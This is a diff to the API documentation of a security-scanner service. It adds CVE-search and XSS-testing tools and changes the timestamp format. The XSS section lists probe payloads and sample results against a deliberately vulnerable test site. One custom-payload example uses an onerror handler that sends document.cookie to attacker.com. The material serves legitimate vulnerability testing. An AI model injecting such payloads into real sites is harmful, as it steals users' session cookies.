@@ -164,8 +164,8 @@ curl -H "X-API-Key: your-key" http://localhost:5000/scan ...
     "tool": "tool_name",
     "target": "domain.com",
     "status": "running",
-    "created_at": "2024-01-01T12:00:00Z",
-    "started_at": "2024-01-01T12:00:05Z"
+    "created_at": "2024-01-01 17:30:00",
+    "started_at": "2024-01-01 17:30:05"
 }
 ```
 
@@ -189,7 +189,8 @@ curl -H "X-API-Key: your-key" http://localhost:5000/scan ...
     "result": {
         "tool-specific": "data"
     },
-    "completed_at": "2024-01-01T12:05:00Z"
+    "completed_at": "2024-01-01 17:35:00",
+    "completed_in": "0:05:00"
 }
 ```
 
@@ -225,9 +226,10 @@ Check scan progress and status.
 - `tool`: Scanner used
 - `target`: Target being scanned
 - `status`: Current status
-- `created_at`: Job creation time
-- `started_at`: Scan start time (if running/completed)
-- `completed_at`: Completion time (if finished)
+- `created_at`: Job creation time (IST)
+- `started_at`: Scan start time (IST, if running/completed)
+- `completed_at`: Completion time (IST, if finished)
+- `completed_in`: Duration of scan execution (if finished)
 - `error`: Error message (if failed)
 
 ### GET /results/{job_id}
@@ -1103,6 +1105,213 @@ Assesses Microsoft SharePoint installations for security weaknesses.
 }
 ```
 
+### 17. CVE Search (cvesearch)
+Comprehensive CVE discovery using multiple scanning methods.
+
+**Parameters:**
+- `use_nuclei`: Enable Nuclei CVE scanning (default: true)
+- `use_nmap`: Enable Nmap vulnerability scripts (default: true)
+- `severity`: Filter by severity - "all", "critical", "high", "medium", "low" (default: "all")
+
+**Usage:**
+```json
+{
+    "tool": "cvesearch",
+    "target": "example.com",
+    "params": {
+        "use_nuclei": true,
+        "use_nmap": true,
+        "severity": "high"
+    }
+}
+```
+
+**Output:**
+```json
+{
+    "tool": "cvesearch",
+    "target": "example.com",
+    "target_url": "http://example.com",
+    "command": "cvesearch nuclei_cve_scan + nmap_cve_scan",
+    "methods_used": {
+        "nuclei_cve_scan": true,
+        "nmap_cve_scan": true
+    },
+    "cve_results": [
+        {
+            "cve_id": "CVE-2021-44228",
+            "severity": "critical",
+            "sources": ["nuclei", "nmap"],
+            "descriptions": ["Apache Log4j2 JNDI features do not protect against attacker controlled LDAP"],
+            "template_name": "Apache Log4j RCE",
+            "matched_at": "http://example.com",
+            "port": 8080,
+            "service": "http"
+        }
+    ],
+    "total_cves_found": 1,
+    "severity_summary": {
+        "critical": 1,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "unknown": 0
+    },
+    "scan_duration": 45.2,
+    "parameters_used": {
+        "use_nuclei": true,
+        "use_nmap": true,
+        "severity_filter": "high"
+    }
+}
+```
+
+### 18. XSS Detection & Exploitation (xssstrike)
+Comprehensive Cross-Site Scripting (XSS) vulnerability detection and exploitation tool using multiple testing techniques.
+
+**Parameters:**
+- `crawl_depth`: Depth of website crawling (1-5, default: 2)
+- `payload_level`: Payload complexity level (1=basic, 2=medium, 3=advanced, default: 2)
+- `blind_xss`: Enable blind XSS testing (default: false)
+- `custom_payloads`: Array of custom XSS payloads to test
+- `timeout`: Request timeout in seconds (5-30, default: 10)
+- `user_agent`: Custom User-Agent string for requests
+
+**Testing Methods:**
+1. **Reflected XSS**: Tests URL parameters for reflection
+2. **Form-based XSS**: Discovers and tests web forms
+3. **DOM XSS**: Analyzes JavaScript for DOM-based vulnerabilities
+4. **Stored XSS**: Tests for persistent XSS (payload level 2+)
+5. **Blind XSS**: External callback testing (when enabled)
+
+**Basic Usage:**
+```json
+{
+    "tool": "xssstrike",
+    "target": "http://testphp.vulnweb.com"
+}
+```
+
+**Advanced Usage:**
+```json
+{
+    "tool": "xssstrike",
+    "target": "http://testphp.vulnweb.com",
+    "params": {
+        "payload_level": 3,
+        "crawl_depth": 3,
+        "blind_xss": true,
+        "custom_payloads": [
+            "<script>alert('Custom XSS')</script>",
+            "<img src=x onerror=alert(document.domain)>"
+        ],
+        "timeout": 15,
+        "user_agent": "Mozilla/5.0 Custom XSS Scanner"
+    }
+}
+```
+
+**Output:**
+```json
+{
+    "tool": "xssstrike",
+    "target": "http://testphp.vulnweb.com",
+    "target_url": "http://testphp.vulnweb.com",
+    "command": "xssstrike url_parameter_testing + form_discovery + dom_xss_detection + stored_xss_testing",
+    "xss_results": {
+        "vulnerable_endpoints": [
+            {
+                "url": "http://testphp.vulnweb.com/search.php",
+                "parameter": "searchFor",
+                "method": "GET",
+                "type": "reflected"
+            }
+        ],
+        "reflected_parameters": [
+            {
+                "url": "http://testphp.vulnweb.com/search.php?searchFor=<script>alert('XSS')</script>",
+                "parameter": "searchFor",
+                "payload": "<script>alert('XSS')</script>",
+                "method": "GET",
+                "type": "reflected",
+                "severity": "high",
+                "evidence": "<!DOCTYPE html><html><body>Results for: <script>alert('XSS')</script>..."
+            }
+        ],
+        "stored_xss": [],
+        "dom_xss": [
+            {
+                "url": "http://testphp.vulnweb.com/index.php",
+                "type": "dom_xss",
+                "severity": "medium",
+                "sink": "document\\.write\\s*\\(",
+                "source": "location\\.hash",
+                "description": "Potential DOM XSS: dangerous sink with controllable source"
+            }
+        ],
+        "payloads_tested": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>"
+        ],
+        "successful_payloads": [
+            "<script>alert('XSS')</script>"
+        ],
+        "severity_summary": {
+            "critical": 0,
+            "high": 1,
+            "medium": 1,
+            "low": 0
+        }
+    },
+    "statistics": {
+        "total_vulnerabilities": 2,
+        "unique_endpoints": 2,
+        "reflected_xss": 1,
+        "stored_xss": 0,
+        "dom_xss": 1,
+        "payloads_tested": 8,
+        "successful_payloads": 1
+    },
+    "severity_summary": {
+        "critical": 0,
+        "high": 1,
+        "medium": 1,
+        "low": 0
+    },
+    "scan_duration": 23.4,
+    "parameters_used": {
+        "crawl_depth": 2,
+        "payload_level": 2,
+        "blind_xss": false,
+        "timeout": 10
+    }
+}
+```
+
+**Payload Levels:**
+- **Level 1 (Basic)**: Simple script tags and event handlers
+- **Level 2 (Medium)**: Encoded payloads, alternative execution methods
+- **Level 3 (Advanced)**: Evasion techniques, obfuscation, encoding bypasses
+
+**Common Scan Scenarios:**
+
+1. **Quick XSS Assessment:**
+```json
+{"tool": "xssstrike", "target": "http://example.com", "params": {"payload_level": 1, "crawl_depth": 1}}
+```
+
+2. **Comprehensive XSS Audit:**
+```json
+{"tool": "xssstrike", "target": "http://example.com", "params": {"payload_level": 3, "crawl_depth": 3, "blind_xss": true}}
+```
+
+3. **Custom Payload Testing:**
+```json
+{"tool": "xssstrike", "target": "http://example.com", "params": {"custom_payloads": ["<script>alert(document.domain)</script>", "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>"]}}
+```
+
 ---
 
 ## Management Endpoints
@@ -1131,7 +1340,7 @@ curl -H "X-API-Key: your-api-key" \
             "tool": "nuclei",
             "target": "example.com",
             "status": "completed",
-            "created_at": "2024-01-01T12:00:00Z"
+            "created_at": "2024-01-01 17:30:00"
         }
     ]
 }
@@ -1150,7 +1359,7 @@ Health check endpoint for monitoring.
         "wafw00f", "nmap", "nuclei", "dirb", 
         "whatweb", "nikto", "masscan", "sslscan", "httpx", "gvm"
     ],
-    "timestamp": "2024-01-01T12:00:00Z"
+    "timestamp": "2024-01-01 17:30:00"
 }
 ```
 
@@ -1229,144 +1438,6 @@ jobs_by_status{status="failed"} 5
 ```
 
 ---
-
-## Examples
-
-### Complete Workflow Example
-
-```bash
-# 1. Start a comprehensive scan
-RESPONSE=$(curl -s -X POST http://127.0.0.1:5000/scan \
-  -H "Content-Type: application/json" \
-  -d '{
-    "tool": "httpx",
-    "target": "example.com",
-    "params": {"follow_redirects": true}
-  }')
-
-# Extract job ID
-JOB_ID=$(echo $RESPONSE | jq -r '.job_id')
-echo "Started scan with job ID: $JOB_ID"
-
-# 2. Monitor progress
-while true; do
-    STATUS=$(curl -s http://127.0.0.1:5000/status/$JOB_ID | jq -r '.status')
-    echo "Current status: $STATUS"
-    
-    if [ "$STATUS" = "completed" ] || [ "$STATUS" = "failed" ]; then
-        break
-    fi
-    
-    sleep 5
-done
-
-# 3. Get results
-if [ "$STATUS" = "completed" ]; then
-    curl -s http://127.0.0.1:5000/results/$JOB_ID | jq '.'
-else
-    echo "Scan failed"
-fi
-```
-
-### Batch Scanning Multiple Targets
-
-```bash
-#!/bin/bash
-TARGETS=("example.com" "google.com" "github.com")
-JOB_IDS=()
-
-# Start all scans
-for target in "${TARGETS[@]}"; do
-    response=$(curl -s -X POST http://127.0.0.1:5000/scan \
-      -H "Content-Type: application/json" \
-      -d "{\"tool\": \"httpx\", \"target\": \"$target\"}")
-    
-    job_id=$(echo $response | jq -r '.job_id')
-    JOB_IDS+=($job_id)
-    echo "Started scan for $target: $job_id"
-done
-
-# Wait for all to complete
-for job_id in "${JOB_IDS[@]}"; do
-    while true; do
-        status=$(curl -s http://127.0.0.1:5000/status/$job_id | jq -r '.status')
-        if [ "$status" = "completed" ] || [ "$status" = "failed" ]; then
-            break
-        fi
-        sleep 2
-    done
-    echo "Job $job_id completed with status: $status"
-done
-```
-
-### Python Client Example
-
-```python
-import requests
-import time
-import json
-
-class SecurityScannerClient:
-    def __init__(self, base_url="http://127.0.0.1:5000"):
-        self.base_url = base_url
-    
-    def start_scan(self, tool, target, params=None):
-        """Start a new scan"""
-        payload = {
-            "tool": tool,
-            "target": target,
-            "params": params or {}
-        }
-        
-        response = requests.post(f"{self.base_url}/scan", json=payload)
-        return response.json()
-    
-    def get_status(self, job_id):
-        """Get scan status"""
-        response = requests.get(f"{self.base_url}/status/{job_id}")
-        return response.json()
-    
-    def get_results(self, job_id):
-        """Get scan results"""
-        response = requests.get(f"{self.base_url}/results/{job_id}")
-        return response.json()
-    
-    def wait_for_completion(self, job_id, timeout=300):
-        """Wait for scan to complete"""
-        start_time = time.time()
-        
-        while time.time() - start_time < timeout:
-            status_data = self.get_status(job_id)
-            status = status_data.get('status')
-            
-            if status in ['completed', 'failed', 'cancelled']:
-                return status_data
-            
-            time.sleep(5)
-        
-        raise TimeoutError(f"Scan {job_id} did not complete within {timeout} seconds")
-
-# Usage example
-client = SecurityScannerClient()
-
-# Start a nuclei scan
-scan_response = client.start_scan("nuclei", "example.com")
-job_id = scan_response['job_id']
-
-print(f"Started scan: {job_id}")
-
-# Wait for completion
-final_status = client.wait_for_completion(job_id)
-print(f"Scan completed with status: {final_status['status']}")
-
-# Get results if successful
-if final_status['status'] == 'completed':
-    results = client.get_results(job_id)
-    print(json.dumps(results, indent=2))
-```
-
----
-
 ## Best Practices
 
 ### 1. Job Management
